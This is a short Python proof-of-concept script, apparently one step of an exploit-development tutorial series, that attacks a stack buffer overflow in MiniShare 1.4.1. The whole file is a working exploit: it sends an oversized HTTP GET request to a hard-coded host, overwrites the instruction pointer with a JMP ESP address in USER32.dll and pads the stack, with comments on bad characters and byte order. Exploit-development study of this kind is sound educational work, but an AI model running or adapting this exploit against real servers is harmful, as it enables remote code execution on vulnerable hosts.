#!/usr/bin/python3.8
# This is a Proof of concept about BufferOverflow vulnerability in MiniShare 1.4.1

# Part 6 of proof of concept by Vry4n
# This script is intended full the buffer, modify EIP value with our JMP ESP value 7E4456F7, which refers to USER32.dll
# execute it, and then fill with Cs

# badchars \x00\x0d
# JMP ESP 7E4456F7, as this is intel processor this is read as little endian, see EIP variable from lest significant bit
import socket

# buffer 1787
FUZZ = "A" * 1787
EIP =  b"\xF7\x56\x44\x7E"
junk = "C" * 500


print("Fuzzing with {} bytes".format(len(FUZZ)))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(("192.168.0.5", 80))
# from a web proxy capturing the HTTP GET Request, we got this line "GET / HTTP/1.1" This is the vulnerable section
s.send(b"GET " + FUZZ.encode() + EIP + junk.encode() + b"HTTP/1.1\r\n\r\n")
s.recv(1024)
s.close()
